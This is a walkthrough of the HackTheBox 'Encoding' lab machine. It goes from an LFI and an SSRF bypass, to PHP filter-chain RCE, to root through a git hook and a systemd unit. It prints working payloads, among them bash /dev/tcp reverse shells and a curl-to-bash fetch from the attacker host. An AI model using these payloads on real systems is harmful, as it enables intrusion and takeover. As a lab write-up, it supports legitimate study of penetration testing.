# HTB: Encoding - Complete Walkthrough

**Target IP:** `10.129.11.197`  
**Attacker IP:** `10.10.16.84`  
**OS:** Linux (Ubuntu 22.04)  
**Difficulty:** Medium

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Understanding the Web Application](#2-understanding-the-web-application)
3. [Discovering the LFI](#3-discovering-the-lfi)
4. [The SSRF Bypass](#4-the-ssrf-bypass)
5. [From LFI to RCE](#5-from-lfi-to-rce)
6. [Shell as www-data](#6-shell-as-www-data)
7. [Privilege Escalation to svc](#7-privilege-escalation-to-svc)
8. [Privilege Escalation to root](#8-privilege-escalation-to-root)
9. [Key Lessons](#9-key-lessons)

---

## 1. Reconnaissance

### Hacker Mindset
Before touching anything, we need to understand what we're dealing with. Reconnaissance is about mapping the attack surface. Every open port is a potential entry point. We scan all ports first (fast), then deep-dive into the open ones with service detection.

### Commands
```bash
# Fast port scan - find all open ports
sudo nmap -p- --min-rate 10000 10.129.11.197

# Detailed scan on discovered ports
sudo nmap -p 22,80 -sCV 10.129.11.197
```

### Results
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

**Analysis:** Only two ports open. SSH is usually not directly exploitable without credentials. HTTP is our primary target. The Apache and OpenSSH versions suggest Ubuntu 22.04 "Jammy."

### Adding Hosts to /etc/hosts
```bash
echo "10.129.11.197 haxtables.htb api.haxtables.htb image.haxtables.htb" | sudo tee -a /etc/hosts
```

**Why:** Modern web applications often use virtual hosts (vhosts) to serve different content based on the `Host` header. If we only visit the IP, we might miss subdomains that serve critical functionality. The main site's API documentation mentions `api.haxtables.htb`, so we add it proactively.

---

## 2. Understanding the Web Application

### Hacker Mindset
When you land on a web app, don't just click around randomly. Understand the tech stack, identify entry points, and look for places where user input reaches the server. Every form, every API endpoint, and every URL parameter is a potential attack vector.

### What We Found
- **Main Site (`haxtables.htb`):** A "string and number converter" toy app. Has pages for String, Integer, Image, and API documentation.
- **API Site (`api.haxtables.htb`):** Documented endpoints for `POST /v3/tools/string/index.php` and `POST /v3/tools/integer/index.php`.
- **Image Site (`image.haxtables.htb`):** Returns 403 Forbidden. This is suspicious — it might be filtering by IP.

**Key Observation:** The API documentation shows Python examples. The last example is interesting:
```python
json_data = {
    'action': 'str2hex',
    'file_url' : 'http://example.com/data.txt'
}
response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
```

**The `file_url` parameter stands out.** Instead of sending data directly, we can ask the server to fetch data from a URL. This screams "Server-Side Request Forgery (SSRF)" or "Local File Inclusion (LFI)."

---

## 3. Discovering the LFI

### Hacker Mindset
When you see a parameter that takes a URL, immediately test:
1. **SSRF:** Can it reach internal services? (`http://127.0.0.1`, `http://localhost`)
2. **LFI:** Can it read local files? (`file:///etc/passwd`)
3. **RFI:** Can it load remote files? (`http://attacker.com/evil.php`)

The `file://` scheme is often forgotten by developers. They might block `http://127.0.0.1` but completely miss `file:///etc/passwd`.

### Testing the LFI
```bash
curl -s -X POST http://api.haxtables.htb/v3/tools/string/index.php \
  -H "Content-Type: application/json" \
  -d '{"action":"str2hex","file_url":"file:///etc/passwd"}' | \
  python3 -c "import sys,json; print(bytes.fromhex(json.load(sys.stdin)['data']).decode())"
```

**Result:** The server returns the hex-encoded contents of `/etc/passwd`.

**Why this works:** The server uses `curl` or `file_get_contents()` to fetch the URL. The `file://` scheme tells it to read from the local filesystem instead of making an HTTP request. The developer only blocked HTTP SSRF, not file-based LFI.

**What we learned:**
- We can read any file the web server user (`www-data`) can read.
- The user `svc` exists on the system (`uid=1000`).
- The hostname is `encoding`.

---

## 4. The SSRF Bypass

### Hacker Mindset
We know `image.haxtables.htb` returns 403 from our IP. The Apache config (which we can read via LFI) reveals:
```apache
<Directory /var/www/image> 
    Deny from all
    Allow from 127.0.0.1
</Directory>
```

It's localhost-only. We need to reach it from the server itself. The `file_url` parameter has a check:
```php
$domain = parse_url($url, PHP_URL_HOST);
if (gethostbyname($domain) === "127.0.0.1") {
    echo jsonify(["message" => "Unacceptable URL"]);
}
```

**The Vulnerability:** PHP's `parse_url()` is weird. If you pass `http://image.haxtables.htb`, it returns `image.haxtables.htb`. But if you pass `image.haxtables.htb` **without the scheme**, `parse_url()` returns `NULL` for the host. `gethostbyname(NULL)` does NOT return `127.0.0.1`, so the check passes. Meanwhile, `curl` doesn't care if there's no scheme — it defaults to HTTP.

### Testing the Bypass
```bash
curl -s -X POST http://api.haxtables.htb/v3/tools/string/index.php \
  -H "Content-Type: application/json" \
  -d '{"action":"str2hex","file_url":"image.haxtables.htb/actions/action_handler.php?page=/etc/passwd"}' | \
  python3 -c "import sys,json; print(bytes.fromhex(json.load(sys.stdin)['data']).decode())"
```

**Result:** We read `/etc/passwd` through `image.haxtables.htb`. The bypass works.

**What we discovered:** `image.haxtables.htb/actions/action_handler.php` contains:
```php
<?php
include_once 'utils.php';
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);  // <-- LFI!
}
?>
```

This is a direct file inclusion. If we can make PHP execute code through this `include()`, we get RCE.

---

## 5. From LFI to RCE

### Hacker Mindset
Classic LFI (Local File Inclusion) used to require log poisoning or file uploads to get RCE. But modern PHP has a powerful technique: **PHP Filter Chain Injection**.

The idea: PHP's `php://filter/` wrapper allows chaining conversion filters. By carefully stacking encoding/decoding filters on a temporary empty file, we can craft arbitrary PHP code byte-by-byte. The server includes our filter chain, which generates and executes our payload.

### Tool: php_filter_chain_generator
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
```

This tool generates the exact filter chain needed to inject arbitrary PHP code.

### Proving Code Execution
First, test with a simple command to confirm execution:
```bash
python3 -c "
import subprocess, requests

chain = subprocess.check_output([
    'python3', 'php_filter_chain_generator.py',
    '--chain', '<?php system(\"id\"); ?>'
], text=True).splitlines()[-1].strip()

resp = requests.post(
    'http://api.haxtables.htb/v3/tools/string/index.php',
    json={'action': 'str2hex', 'file_url': f'image.haxtables.htb/actions/action_handler.php?page={chain}'}
)

print(bytes.fromhex(resp.json()['data']).decode())
"
```

**Result:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**We have RCE as www-data.**

---

## 6. Shell as www-data

### Hacker Mindset
Getting RCE is great, but an interactive shell is better. We need a stable reverse shell. The challenge: the filter chain is very long (thousands of characters). If the request hangs or times out, the server might kill the PHP process before the shell spawns.

**Better approach:** Instead of embedding a long reverse shell command in the filter chain, keep the command short. The shortest reliable approach is to have the server download a shell script from us and pipe it to bash.

### Setting Up the Shell
**Terminal 1 (Kali) — create script and start HTTP server:**
```bash
echo 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1' > /tmp/shell.sh
python3 -m http.server 8000
```

**Terminal 2 (Kali) — start listener:**
```bash
nc -lnvp 4444
```

**Terminal 3 (Kali) — send the payload:**
```bash
python3 -c "
import subprocess, requests

chain = subprocess.check_output([
    'python3', 'php_filter_chain_generator.py',
    '--chain', '<?php system(\"curl -s http://10.10.16.84:8000/shell.sh | bash\"); ?>'
], text=True).splitlines()[-1].strip()

requests.post(
    'http://api.haxtables.htb/v3/tools/string/index.php',
    json={'action': 'str2hex', 'file_url': f'image.haxtables.htb/actions/action_handler.php?page={chain}'}
)
print('Payload sent.')
"
```

**Why this works:**
- The filter chain is short because the PHP payload is short.
- `system()` returns immediately because `curl | bash` forks the shell in the background.
- The backgrounded bash shell connects back to our listener independently.

**Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 45534
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@encoding:~/image/actions$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. Privilege Escalation to svc

### Hacker Mindset
Always run `sudo -l` on any shell you get. It tells you exactly what the current user can do with elevated privileges.

From the www-data shell:
```bash
sudo -l
```

**Result:**
```
User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
```

We can run a git commit script as `svc` without a password. Time to understand what this script does.

### Analyzing git-commit.sh
```bash
#!/bin/bash
u=$(/usr/bin/git --git-dir=/var/www/image/.git --work-tree=/var/www/image ls-files -o --exclude-standard)

if [[ $u ]]; then
    /usr/bin/git --git-dir=/var/www/image/.git --work-tree=/var/www/image add -A
else
    /usr/bin/git --git-dir=/var/www/image/.git --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>" --no-verify
fi
```

**Logic:**
- If there are untracked files in `/var/www/image`, add them.
- If there are NO untracked files, commit the staged changes.

**The Hook:** Git has a hook called `post-commit` that runs **after** a successful commit. If we write a malicious `post-commit` script and trigger a commit as `svc`, our code executes as `svc`.

### Checking Permissions
```bash
getfacl /var/www/image/.git/
```

**Result:**
```
user:www-data:rwx
```

`www-data` can write to the `.git` directory, including `.git/hooks/`.

### The Exploit

**Step 1 — write the post-commit hook:**
```bash
cd /var/www/image
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.84/5555 0>&1' > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
```

**Step 2 — stage a file to force a commit:**
```bash
/usr/bin/git --git-dir=/var/www/image/.git --work-tree=/etc add /etc/hosts
```

We use `--work-tree=/etc` to stage a file outside the repo. This doesn't create untracked files in `/var/www/image`, so `git-commit.sh` will take the `else` branch and commit.

**Step 3 — trigger the commit as svc:**
```bash
sudo -u svc /var/www/image/scripts/git-commit.sh
```

**Step 4 — catch the shell on Kali (port 5555):**
```bash
nc -lnvp 5555
```

**Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 38652
svc@encoding:/var/www/image$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

**Why this works:** Git hooks run with the privileges of the user executing git. Since `sudo -u svc` runs git as `svc`, the hook also runs as `svc`.

---

## 8. Privilege Escalation to root

### Hacker Mindset
Again, `sudo -l` is the first thing to run.

```bash
sudo -l
```

**Result:**
```
User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *
```

`svc` can restart **any** systemd service as root. Systemd services run as whatever user is specified in their unit file. If we create a service that runs as `root` and executes a command of our choosing, we get root.

### Checking Writable Paths
```bash
find /etc/systemd -writable
```

**Result:** `/etc/systemd/system` is writable by `svc`.

### The Exploit

**Step 1 — create the malicious service:**
```bash
echo '[Unit]
Description=privesc

[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.16.84/7777 0>&1"

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/privesc.service
```

**Step 2 — start listener on Kali:**
```bash
nc -lnvp 7777
```

**Step 3 — restart the service as root:**
```bash
sudo systemctl restart privesc
```

**Why this works:**
- `svc` can write to `/etc/systemd/system/`.
- `svc` can run `systemctl restart *` as root without a password.
- On this systemd version, `restart` on a newly created unit file works without `daemon-reload`.
- The service runs `ExecStart` as `root` (default user for system services is root).

**Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 35676
root@encoding:/# id
uid=0(root) gid=0(root) groups=0(root)
root@encoding:/# cat /root/root.txt
2ee93a[redacted]3ea36ea1
```

---

## 9. Key Lessons

### 1. Parse URL Quirks
PHP's `parse_url()` without a scheme returns `NULL` for the host. Developers who rely on it for SSRF protection create trivial bypasses.

### 2. File Schemes Are Forgotten
If an application fetches URLs, always test `file:///etc/passwd`. Developers often secure HTTP/HTTPS but completely miss `file://`.

### 3. PHP Filter Chains
Modern PHP LFI can become RCE through `php://filter/` chain injection. Learn this technique — it works on many CTFs and real applications.

### 4. Abusing Git Hooks
If a user can run `git` as another user (via sudo, cron, etc.), and can write to `.git/hooks/`, that's essentially code execution as the target user.

### 5. systemctl restart *
`systemctl restart *` as root is incredibly powerful. Any user who can create unit files and restart services can get root.

### 6. Short Payloads Beat Long Ones
When exploiting through injection or encoding, shorter payloads are more reliable. Offload complexity to a downloaded script rather than embedding it directly.

---

## Flags

| User | `fed396[redacted]df885b9d` |
|------|-------------------------------------|
| Root | `2ee93a1[redacted]ea36ea1` |
